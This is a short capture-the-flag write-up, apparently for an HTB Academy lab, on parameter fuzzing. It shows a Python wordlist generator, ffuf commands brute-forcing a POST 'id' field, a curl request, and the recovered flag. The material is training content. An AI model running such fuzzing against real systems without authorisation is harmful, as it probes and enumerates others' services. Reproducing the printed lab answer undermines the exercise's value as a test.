## Challenge

Try to create the 'ids.txt' wordlist, identify the accepted value with a fuzzing scan, and then use it in a 'POST' request with 'curl' to collect the flag. What is the content of the flag?

## Solution

I have created a wordlist with numbers from 1 to 1000, via a python script:

```py
# Python script to generate a wordlist with numbers from 1 to 1000

# Define the output file path
output_file = 'wordlist.txt'

# Open the file in write mode
with open(output_file, 'w') as file:
    # Write numbers from 1 to 1000 into the file
    for i in range(1, 1001):
        file.write(f"{i}\n")

print(f"Wordlist saved to {output_file}")
```

After running this script, it created a file `wordlist.txt`, which I will use with `ffuf`.

```sh
ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:50837/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded'
```

I see that the size 768 is quite common among the `200 OK`s, so I filter this out:

```sh
ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:50837/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 768
```

And I got a result:

```sh
73                      [Status: 200, Size: 787, Words: 218, Lines: 54, Duration: 26ms]
```

In this case I will `curl` to the page with this id:

```sh
curl http://admin.academy.htb:50837/admin/admin.php -X POST -d 'id=73' -H 'Content-Type: application/x-www-form-urlencoded'
```

And, in the response I have the flag:

```html
<div class='center'><p>HTB{p4r4m373r_fuzz1n6_15_k3y!}</p></div>
```
